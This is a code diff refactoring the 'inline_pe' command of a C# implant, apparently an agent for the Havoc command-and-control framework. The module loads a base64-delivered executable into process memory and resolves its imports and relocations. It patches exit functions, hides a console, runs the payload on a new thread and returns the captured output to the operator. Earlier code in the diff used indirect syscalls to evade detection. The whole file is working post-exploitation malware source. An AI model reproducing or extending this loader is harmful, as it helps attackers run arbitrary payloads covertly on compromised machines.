@@ -1,3 +1,4 @@
+using HavocImplant.NativeUtils;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -6,106 +7,40 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using static HavocImplant.NativeUtils.Delegates;
 using static HavocImplant.NativeUtils.Structs;
 using static HavocImplant.NativeUtils.Structs.Win32;
-using HavocImplant.NativeUtils;
+using static HavocImplant.NativeUtils.Wrappers;
 
 namespace HavocImplant.AgentFunctions
 {
 
     //Thanks apollo and nettitude
-    public class InlinePE
+    public class InlinePE : CommandInterface
     {
- 
-        // idk why i rewrote this one
-        public IntPtr GetStdHandle(int nStdHandle)
-        {
-            IntPtr pInformation = IntPtr.Zero;
-            object[] allocArgs = new object[] { (IntPtr)(-1), pInformation, IntPtr.Zero, (IntPtr)0x38, Enums.AllocationType.Commit | Enums.AllocationType.Reserve, Enums.MemoryProtection.ReadWrite };
-            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", allocArgs);
-            pInformation = (IntPtr)allocArgs[1];
-
-            object[] queryArgs = new object[] { (IntPtr)(-1), 0,  pInformation, (uint)Marshal.SizeOf(typeof(Structs.Win32.PROCESS_BASIC_INFORMATION)), IntPtr.Zero}; //class 0 = PBI
-            ntdll.indirectSyscallInvoke<Delegates.NtQueryInformationProcess>("NtQueryInformationProcess", queryArgs);
-            pInformation = (IntPtr)queryArgs[2];
-            Structs.Win32.PROCESS_BASIC_INFORMATION pbi = (Structs.Win32.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pInformation, typeof(Structs.Win32.PROCESS_BASIC_INFORMATION));
-
-            IntPtr pProccessParams = Marshal.ReadIntPtr(IntPtr.Add(pbi.PebAddress, 0x20)); // PEB addr is 0x20 into PBI
-
-            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pInformation, (IntPtr)Marshal.SizeOf(pbi), (uint)0x8000 });
-
-            switch (nStdHandle)
-            {
-                case STD_OUTPUT_HANDLE:
-                    return Marshal.ReadIntPtr(IntPtr.Add(pProccessParams, 0x28));
-                case STD_ERROR_HANDLE:
-                    return Marshal.ReadIntPtr(IntPtr.Add(pProccessParams, 0x30));
-            }
-            return IntPtr.Zero;
-        }
-        public bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize)
-        {
-            object[] args = new object[] { IntPtr.Zero, IntPtr.Zero, lpPipeAttributes, nSize };
-            bool retVal = (bool)kernel32.dynamicExecute<Delegates.CreatePipe>("CreatePipe", args);
-            hReadPipe = (IntPtr)args[0];
-            hWritePipe = (IntPtr)args[1];
-            lpPipeAttributes = (SECURITY_ATTRIBUTES)args[2];
-            return retVal;
-        }
-        public bool SetStdHandle(int nStdHandle, IntPtr hHandle)
-        { 
-            return (bool)kernel32.dynamicExecute<Delegates.SetStdHandle>("SetStdHandle", new object[] { nStdHandle, hHandle});
-        }
-        public bool AllocConsole()
-        {
-            return (bool)kernel32.dynamicExecute<Delegates.AllocConsole>("AllocConsole", new object[]{ });
-        }
-        public IntPtr GetConsoleWindow()
-        {
-            return (IntPtr)kernel32.dynamicExecute<Delegates.GetConsoleWindow>("GetConsoleWindow", new object[] { });
-        }
-        public bool HideWindow(IntPtr hWnd) 
-        {
-            return (bool)user32.dynamicExecute<Delegates.ShowWindow>("ShowWindow", new object[] { hWnd, 0 });
-        }
-        public bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
-        {
-            object[] args = new object[] { hFile, lpBuffer, nNumberOfBytesToRead, (uint)0, lpOverlapped };
-            bool retVal = (bool)kernel32.dynamicExecute<Delegates.ReadFile>("ReadFile", args);
-            lpBuffer = (byte[])args[1];
-            lpNumberOfBytesRead = (uint)args[3];
-            return retVal;
-        }
-        public bool CloseHandle(IntPtr hObject) 
-        {
-            return (bool)kernel32.dynamicExecute<Delegates.CloseHandle>("CloseHandle", new object[] { hObject});
-        }
+        public override string Command => "inline_pe";
+        public override bool Dangerous => true;
 
         public byte[] rawbytes;
         public int size;
-        Implant agent;
-        dll ntdll = globalDll.ntdll;
-        dll kernel32 = globalDll.kernel32;
-        dll win32u = globalDll.win32u;
-        dll user32 = globalDll.user32;
-        public string output;
+
+
         // General PE stuff
-        public Structs.Win32.IMAGE_DOS_HEADER dosHeader;
-        public Structs.Win32.IMAGE_FILE_HEADER fileHeader;
-        public Structs.Win32.IMAGE_OPTIONAL_HEADER64 optionalHeader;
-        public Structs.Win32.IMAGE_SECTION_HEADER[] imageSectionHeaders;
+        public IMAGE_DOS_HEADER dosHeader;
+        public IMAGE_FILE_HEADER fileHeader;
+        public IMAGE_OPTIONAL_HEADER64 optionalHeader;
+        public IMAGE_SECTION_HEADER[] imageSectionHeaders;
         public IntPtr peBase = IntPtr.Zero;
         public List<String> originalModules = new List<String>();
 
         // To prevent thread exiting from killing the process
         byte[] terminateProcessOriginalBytes;
         byte[] corExitProcessOriginalBytes;
-        byte[] ntTerminateProcessOriginalBytes;
         byte[] rtlExitUserProcessOriginalBytes;
 
         // For arg fixing
         public string fileName;
-        public string[] args;
+        public string args;
         byte[] originalCommandLineFuncBytes;
         string commandLineFunc;
 
@@ -118,8 +53,6 @@ namespace HavocImplant.AgentFunctions
             public IntPtr Read;
             public IntPtr Write;
         }
-        private const int STD_OUTPUT_HANDLE = -11;
-        private const int STD_ERROR_HANDLE = -12;
         private const uint BYTES_TO_READ = 1024;
 
         private IntPtr _oldGetStdHandleOut;
@@ -130,37 +63,36 @@ namespace HavocImplant.AgentFunctions
 
         private IntPtr hWin;
 
-        public static void Run(Implant agent, string taskInfo, int taskId)
+        public InlinePE() // For initial loading
+        {
+        }
+        public override void Run(int taskId)
         {
 
-            byte[] pe_bytes = Convert.FromBase64String(taskInfo.Split(new char[] { ';' }, 2)[0].Substring(5));
-            Console.WriteLine($"PE is {pe_bytes.Length} bytes long");
-            string[] args = taskInfo.Split(new char[] { ';' }, 2)[1].Split(' ');
+            rawbytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
+            args = Agent.taskingInformation[taskId].taskArguments;
+            fileName = "bruh";
 
-            var pe = new InlinePE(agent, pe_bytes, "bruh", args);
-            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [inline_pe]\n" + pe.output).Replace("\\", "\\\\").Replace("\"", "\\\""));
-            
+            //The Class will instantiate itself just so instance vars get cleared on each run
+            Output = new InlinePE(rawbytes, args, fileName).Output; 
+            ReturnOutput(taskId);
         }
         /// <summary>
         /// Reads and parses properties of the PE from disc. Temporarily writes into memory.
         /// </summary>
         /// <param name="ntdll"></param> An ntdll instance for indirect syscalls
         /// <param name="pe"></param> PE byte array
-        public InlinePE(Implant agent, byte[] pe, string fileName, string[] args)
+        public InlinePE(byte[] rawbytes, string args, string fileName)
         {
-            this.agent = agent;
-            this.ntdll = ntdll;
-            this.fileName = fileName;
+            this.rawbytes = rawbytes;
             this.args = args;
-            rawbytes = pe;
-
+            this.fileName = fileName;
             IntPtr tmpPtrDosHeader = IntPtr.Zero;
-            object[] argsNtAllocateVirtualMemory = new object[] { (IntPtr)(-1), tmpPtrDosHeader, IntPtr.Zero, (IntPtr)pe.Length, Structs.Win32.Enums.AllocationType.Commit | Structs.Win32.Enums.AllocationType.Reserve, Structs.Win32.Enums.MemoryProtection.ReadWrite};
-            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory); //Allocate space for the PE
-            tmpPtrDosHeader = (IntPtr)argsNtAllocateVirtualMemory[1];
+            IntPtr regionSize = (IntPtr)rawbytes.Length;
+            NtAllocateVirtualMemory((IntPtr)(-1), ref tmpPtrDosHeader, IntPtr.Zero, ref regionSize, (uint)(Enums.AllocationType.Commit | Enums.AllocationType.Reserve), (uint)Enums.MemoryProtection.ReadWrite);
 
             var unmanagedBytes = GCHandle.Alloc(rawbytes, GCHandleType.Pinned);
-            ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { (IntPtr)(-1), tmpPtrDosHeader, unmanagedBytes.AddrOfPinnedObject(), (uint)pe.Length, (uint)0});
+            NtWriteVirtualMemory((IntPtr)(-1), tmpPtrDosHeader, unmanagedBytes.AddrOfPinnedObject(), (uint)rawbytes.Length, out uint unused);
             unmanagedBytes.Free();
 
             dosHeader = (Structs.Win32.IMAGE_DOS_HEADER)Marshal.PtrToStructure(tmpPtrDosHeader, typeof(Structs.Win32.IMAGE_DOS_HEADER));
@@ -179,12 +111,8 @@ namespace HavocImplant.AgentFunctions
                 else tmpPtrImageSectionHeader = IntPtr.Add(tmpPtrOptionalHeader, Marshal.SizeOf(optionalHeader) + Marshal.SizeOf(imageSectionHeaders[i-1])*i);
                 imageSectionHeaders[i] = (Structs.Win32.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(tmpPtrImageSectionHeader, typeof(Structs.Win32.IMAGE_SECTION_HEADER));
             }
-#if debug
-            Console.WriteLine("Base of PE is at 0x{0:X}", (long)tmpPtrDosHeader);
-            Console.WriteLine("Nt headers at 0x{0:X}", (long)IntPtr.Add(tmpPtrFileHeader, -4));
-            Console.WriteLine("Opt headers at 0x{0:X}", (long)tmpPtrOptionalHeader);
-#endif
-            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), tmpPtrDosHeader, (IntPtr)Marshal.SizeOf(dosHeader), (uint)0x8000 });//Stomp header
+            IntPtr freeSize = (IntPtr)Marshal.SizeOf(dosHeader);
+            NtFreeVirtualMemory((IntPtr)(-1), ref tmpPtrDosHeader, ref freeSize, (uint)0x8000);
             Map();
             ImportResolver();
             PatchExit();
@@ -195,27 +123,22 @@ namespace HavocImplant.AgentFunctions
             ReturnPatches();
             EndRedirect();
             ReadOutput();
+            //kernelbase.dynamicExecute<Delegates.FreeConsole>("FreeConsole", new object[] { });
         }
         public void Map()
         {
-            object[] argsNtAllocateVirtualMemory = new object[] { (IntPtr)(-1), peBase, IntPtr.Zero, (IntPtr)optionalHeader.SizeOfImage, Structs.Win32.Enums.AllocationType.Commit, Structs.Win32.Enums.MemoryProtection.ReadWrite };
-            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory);
-            peBase = (IntPtr)argsNtAllocateVirtualMemory[1];
+            IntPtr SizeOfImage = (IntPtr)optionalHeader.SizeOfImage;
+            NtAllocateVirtualMemory((IntPtr)(-1), ref peBase, IntPtr.Zero, ref SizeOfImage, (uint)Enums.AllocationType.Commit, (uint)Enums.MemoryProtection.ReadWrite);
 
             // Copy Sections
             for (int i = 0; i < fileHeader.NumberOfSections; i++)
             {
                 IntPtr sectionLocation = IntPtr.Add(peBase, (int)imageSectionHeaders[i].VirtualAddress);
-                argsNtAllocateVirtualMemory = new object[] { (IntPtr)(-1), sectionLocation, IntPtr.Zero, (IntPtr)imageSectionHeaders[i].SizeOfRawData, Structs.Win32.Enums.AllocationType.Commit, Win32.Enums.PAGE_READWRITE };
-                ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory);
-                sectionLocation = (IntPtr)argsNtAllocateVirtualMemory[1];
-#if debug
-                Console.WriteLine("Copying {0} to 0x{1:X}", new string(imageSectionHeaders[i].Name), (long)sectionLocation);
-#endif
+                IntPtr sectionSize = (IntPtr)imageSectionHeaders[i].SizeOfRawData;
+                NtAllocateVirtualMemory((IntPtr)(-1), ref sectionLocation, IntPtr.Zero, ref sectionSize, (uint)Enums.AllocationType.Commit, (uint)Enums.PAGE_READWRITE);
 
                 var unmanagedBytes = GCHandle.Alloc(rawbytes.ToList().GetRange((int)imageSectionHeaders[i].PointerToRawData, (int)imageSectionHeaders[i].SizeOfRawData).ToArray(), GCHandleType.Pinned);
-                ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { (IntPtr)(-1), sectionLocation, unmanagedBytes.AddrOfPinnedObject(), (uint)imageSectionHeaders[i].SizeOfRawData, (uint)0 });
-                sectionAddresses.Add(sectionLocation, imageSectionHeaders[i].SizeOfRawData);
+                NtWriteVirtualMemory((IntPtr)(-1), sectionLocation, unmanagedBytes.AddrOfPinnedObject(), imageSectionHeaders[i].SizeOfRawData, out uint nothing);
                 unmanagedBytes.Free();
 
             }
@@ -238,10 +161,7 @@ namespace HavocImplant.AgentFunctions
                 IntPtr pRelocationTableNextBlock = IntPtr.Add(pRelocationTable, sizeOfNextBlock);
                 Structs.Win32.IMAGE_BASE_RELOCATION nextRelocationEntry = (Structs.Win32.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTableNextBlock, typeof(Structs.Win32.IMAGE_BASE_RELOCATION));
                 IntPtr pRelocationEntry = IntPtr.Add(peBase, (int)relocationEntry.VirtualAdress);
-#if debug
-                Console.WriteLine("Section Has {0} Entries",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
-                Console.WriteLine("Next Section Has {0} Entries", (int)(nextRelocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
-#endif
+
                 for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++) // TODO figure out magic numbers
                 {
                     UInt16 value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i); // TODO figure out magic numbers
@@ -380,42 +300,44 @@ namespace HavocImplant.AgentFunctions
                 return true;
             }
 
-            string newCommandLineString = $"\"{fileName}\" {string.Join(" ", args)}";
+            string newCLIStr = $"\"{fileName}\" {args}";
  
             // Patching GetCommandLine and running the PE
-            PatchGetCommandLineFunc(ntdll, newCommandLineString);
+            PatchGetCommandLineFunc(ntdll, newCLIStr);
             
         }
         public void BeginRedirect()
         {
+            
             AllocConsole();
             hWin = GetConsoleWindow();
             HideWindow(hWin);
-
-            _oldGetStdHandleOut = GetStdHandle(STD_OUTPUT_HANDLE);
-            _oldGetStdHandleError = GetStdHandle(STD_ERROR_HANDLE);
+            
+            _oldGetStdHandleOut = GetStdHandle(Enums.STD_OUTPUT_HANDLE);
+            _oldGetStdHandleError = GetStdHandle(Enums.STD_ERROR_HANDLE);
             
             //Creating STDOut/IN/ERR Pipes to redirect to
-            Structs.Win32.SECURITY_ATTRIBUTES outSA = default;
+            SECURITY_ATTRIBUTES outSA = default;
             outSA.nLength = Marshal.SizeOf(outSA);
             outSA.bInheritHandle = 1;
             CreatePipe(out var read, out var write, ref outSA, 0);
             _kpStdOutPipes = new FileDescriptorPair() { Read = read, Write = write};
 
             //Setting the new pipes
-            SetStdHandle(STD_OUTPUT_HANDLE, _kpStdOutPipes.Write);
-            SetStdHandle(STD_ERROR_HANDLE, _kpStdOutPipes.Write);
+            SetStdHandle(Enums.STD_OUTPUT_HANDLE, _kpStdOutPipes.Write);
+            SetStdHandle(Enums.STD_ERROR_HANDLE, _kpStdOutPipes.Write);
 
         }
         public void RunPE()
         {
             // Adjusting memory protections before takeoff
+            Console.WriteLine($"There are {fileHeader.NumberOfSections} sections");
             for (int i = 0; i < fileHeader.NumberOfSections; i++)
             {
                 IntPtr sectionLocation = IntPtr.Add(peBase, (int)imageSectionHeaders[i].VirtualAddress);
                 
                 uint memProtectionConstant = 0;
-                Structs.Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS sectionProtect = (Structs.Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS)imageSectionHeaders[i].Characteristics;
+                Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS sectionProtect = (Structs.Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS)imageSectionHeaders[i].Characteristics;
 
                 if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                     memProtectionConstant = Win32.Enums.PAGE_EXECUTE_READWRITE;
@@ -431,39 +353,39 @@ namespace HavocImplant.AgentFunctions
                     memProtectionConstant = Win32.Enums.PAGE_EXECUTE;
                 else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ))
                     memProtectionConstant = Win32.Enums.PAGE_READONLY;
-                
-                object[] argsNtProtectVirtualMemory = new object[] { (IntPtr)(-1), sectionLocation, (IntPtr)imageSectionHeaders[i].SizeOfRawData, memProtectionConstant, (uint)0 }; //fixing the 
-                ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", argsNtProtectVirtualMemory);
+
+                Console.WriteLine($"Protecting {new string(imageSectionHeaders[i].Name)}");
+                IntPtr sectionSize = (IntPtr)imageSectionHeaders[i].SizeOfRawData;
+                NtProtectVirtualMemory((IntPtr)(-1), ref sectionLocation, ref sectionSize, memProtectionConstant, out uint unused2);
             }
             
             IntPtr threadStartAddress = IntPtr.Add(peBase, (int)optionalHeader.AddressOfEntryPoint);
             IntPtr threadHandle = IntPtr.Zero;
 
-            object[] argsNtCreateThreadEx = new object[] { threadHandle, Structs.Win32.Enums.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, Process.GetCurrentProcess().Handle, threadStartAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
-            ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", argsNtCreateThreadEx);
+            NtCreateThreadEx(ref threadHandle, (uint)Enums.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, Process.GetCurrentProcess().Handle, threadStartAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
 
-            threadHandle = (IntPtr)argsNtCreateThreadEx[0];
-
-            Structs.LargeInteger li = new Structs.LargeInteger();
+            LargeInteger li = new LargeInteger();
             long second = -10000000L;
             li.QuadPart = 5*second;
 
             IntPtr pLargeInt = IntPtr.Zero;
-            object[] allocArgs = new object[] { (IntPtr)(-1), pLargeInt, IntPtr.Zero, (IntPtr)Marshal.SizeOf(pLargeInt), Enums.AllocationType.Commit | Enums.AllocationType.Reserve, Enums.MemoryProtection.ReadWrite };
-            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", allocArgs);
-            pLargeInt = (IntPtr)allocArgs[1];
+            IntPtr liSize = (IntPtr)Marshal.SizeOf(pLargeInt);
+            NtAllocateVirtualMemory((IntPtr)(-1), ref pLargeInt, IntPtr.Zero, ref liSize, (uint)(Enums.AllocationType.Commit | Enums.AllocationType.Reserve), (uint)Enums.MemoryProtection.ReadWrite);
 
             GCHandle unmanagedLargeInt = GCHandle.Alloc(li, GCHandleType.Pinned);
-            ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { (IntPtr)(-1), pLargeInt, unmanagedLargeInt.AddrOfPinnedObject(), (uint)Marshal.SizeOf(li), (uint)0 });
+            NtWriteVirtualMemory((IntPtr)(-1), pLargeInt, unmanagedLargeInt.AddrOfPinnedObject(), (uint)Marshal.SizeOf(li), out uint unused);
             unmanagedLargeInt.Free();
 
-            ntdll.indirectSyscallInvoke<Delegates.NtWaitForSingleObject>("NtWaitForSingleObject", new object[] { threadHandle, false, pLargeInt });
+            NtWaitForSingleObject(threadHandle, false, pLargeInt);
 
-            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pLargeInt, (IntPtr)Marshal.SizeOf(pLargeInt), (uint)0x8000 });
-
+            liSize = (IntPtr)Marshal.SizeOf(pLargeInt);
+            NtFreeVirtualMemory((IntPtr)(-1), ref pLargeInt, ref liSize, (uint)0x8000);
+            
             foreach (var section in sectionAddresses)
             {
-                ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), section.Key, (IntPtr)section.Value, (uint)0x8000 });
+                IntPtr loc = section.Key;
+                IntPtr size = (IntPtr)section.Value;
+                NtFreeVirtualMemory((IntPtr)(-1), ref loc, ref size, (uint)0x8000);
             }
         }
         public void ReturnPatches()
@@ -477,7 +399,7 @@ namespace HavocImplant.AgentFunctions
         {
             _readTask = Task.Factory.StartNew(() =>
             {
-                output = "";
+                string output = "";
 
                 var buffer = new byte[BYTES_TO_READ];
                 byte[] outBuffer;
@@ -499,9 +421,8 @@ namespace HavocImplant.AgentFunctions
         public void EndRedirect()
         {
             
-            SetStdHandle(STD_OUTPUT_HANDLE, _oldGetStdHandleOut);
-            SetStdHandle(STD_ERROR_HANDLE, _oldGetStdHandleError);
-            user32.dynamicExecute<Delegates.DestroyWindow>("DestroyWindow", new object[] { hWin });
+            SetStdHandle(Enums.STD_OUTPUT_HANDLE, _oldGetStdHandleOut);
+            SetStdHandle(Enums.STD_ERROR_HANDLE, _oldGetStdHandleError);
             try
             {
                 // Need to close write before read else it hangs as could still be writing
@@ -526,8 +447,7 @@ namespace HavocImplant.AgentFunctions
             {
                 Thread.Sleep(2000);
             }
-
-            output =  _readTask.Result;
+            Output =  _readTask.Result;
         }
 
     }
